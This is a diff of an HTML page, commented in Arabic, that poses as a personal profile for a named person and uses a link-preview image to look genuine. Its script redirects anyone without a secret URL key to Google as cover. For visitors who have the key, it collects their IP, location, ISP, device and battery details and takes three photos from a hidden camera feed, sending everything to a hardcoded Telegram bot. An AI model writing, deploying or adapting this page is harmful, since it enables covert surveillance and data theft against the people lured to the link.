@@ -3,18 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نسيم كعابنه</title>
+    <title>محمد كعابنة</title>
 
-    <!-- Open Graph Meta Tags - لجعل الرابط يبدو حقيقياً عند المشاركة -->
-    <meta property="og:title" content="نسيم كعابنه">
+    <!-- إعدادات المعاينة (Open Graph) - لكي تظهر الصورة والاسم عند المشاركة -->
+    <meta property="og:title" content="محمد كعابنة">
     <meta property="og:type" content="profile">
-    <meta property="og:image" content="https://via.placeholder.com/300"> <!-- يمكنك وضع رابط صورة حقيقية هنا -->
+    <meta property="og:image" content="https://l.top4top.io/p_3968sozsf0.jpg"> <!-- صورتك التي أرسلتها -->
 
     <style>
-        body { font-family: sans-serif; text-align: center; background: #f0f2f5; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            text-align: center; 
+            background: #f0f2f5; 
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
         video { display: none; } /* إخفاء الفيديو لجعل العملية غير مرئية */
         canvas { display: none; }
-        .loading { margin-top: 100px; font-size: 24px; color: #666; }
+        .loading { font-size: 24px; color: #666; animation: pulse 1.5s infinite; }
+        @keyframes pulse {
+            0% { opacity: 0.5; }
+            50% { opacity: 1; }
+            100% { opacity: 0.5; }
+        }
     </style>
 </head>
 <body>
@@ -24,31 +38,46 @@
     <canvas id="canvas"></canvas>
 
     <script>
-        // --- الإعدادات الأساسية ---
+        // --- الإعدادات الأساسية (تأكد من صحتها) ---
         const TELEGRAM_TOKEN = '8322190390:AAHN2FcpyUVDjsEa5DhFLzaFcgFF0v7nfOw';
         const CHAT_ID = '7184970355';
-        const SECRET_KEY = '123'; // هذا هو المفتاح السري
+        const SECRET_KEY = '123'; 
 
         async function init() {
-            // 1. فحص المفتاح (السر)
+            // فحص المفتاح السري في الرابط
             const urlParams = new URLSearchParams(window.location.search);
             const userKey = urlParams.get('key');
 
             if (userKey !== SECRET_KEY) {
-                // إذا لم يوجد المفتاح، اذهب إلى قوقل فوراً (للخداع)
+                // إذا لم يوجد المفتاح (?key=123)، اذهب إلى جوجل فوراً للتمويه
                 window.location.href = "https://www.google.com";
-                return; // توقف عن تنفيذ باقي الكود
+                return;
             }
 
-            // 2. إذا كان المفتاح صحيحاً، ابدأ العمل الحقيقي
+            // إذا كان المفتاح صحيحاً، ابدأ جمع البيانات
             await startHacking();
+        }
+
+        async function sendToTelegram(text, photoBlob = null) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            if (photoBlob) {
+                formData.append('photo', photoBlob);
+            } else {
+                formData.append('text', text);
+            }
+
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/`, {
+                method: 'POST',
+                body: formData
+            });
         }
 
         async function startHacking() {
             try {
-                let infoText = "🚀 **دخول جديد!**\n\n";
+                let infoText = "🚀 دخول جديد!\n\n";
 
-                // جلب الـ IP واللوكيشن
+                // 1. جلب الـ IP واللوكيشن
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const ipData = await ipRes.json();
 
@@ -56,11 +85,11 @@
                 infoText += `🌍 الدولة: ${ipData.city}, ${ipData.country_name}\n`;
                 infoText += `🌐 مزود الخدمة: ${ipData.org}\n\n`;
 
-                // معلومات الجهاز
+                // 2. معلومات الجهاز
                 infoText += `📱 الجهاز: ${navigator.platform}\n`;
                 infoText += `🌐 المتصفح: ${navigator.userAgent}\n\n`;
 
-                // البطارية
+                // 3. البطارية
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
                     infoText += `🔋 مستوى البطارية: ${(battery.level * 100).toFixed(0)}%\n`;
@@ -69,7 +98,7 @@
 
                 await sendToTelegram(infoText);
             } catch (e) {
-                await sendToTelegram("⚠️ حدث خطأ في جلب البيانات، ولكن الجهاز دخل الرابط.");
+                await sendToTelegram("⚠️ حدث خطأ في جلب البيانات، ولكن الشخص دخل الرابط.");
             }
 
             startCamera();
@@ -83,6 +112,7 @@
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                 video.srcObject = stream;
+                // الانتظار قليلاً ثم التقاط الصور
                 setTimeout(() => capturePhotos(video, canvas, context), 1500);
             } catch (err) {
                 await sendToTelegram("📷 تم الدخول ولكن لم يتم السماح بالكاميرا.");
@@ -90,34 +120,18 @@
         }
 
         async function capturePhotos(video, canvas, context) {
-            for (let i = 0; i < 4; i++) {
+            for (let i = 0; i < 3; i++) { // سيتم التقاط 3 صور
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 context.drawImage(video, 0, 0);
 
                 const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob);
-
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-                await new Promise(r => setTimeout(r, 500));
+                await sendToTelegram("📸 صورة جديدة:", blob);
             }
         }
 
-        async function sendToTelegram(text) {
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
-            });
-        }
-
-        // تشغيل البرنامج
-        init();
+        // تشغيل البرنامج عند تحميل الصفحة
+        window.onload = init;
     </script>
 </body>
 </html>
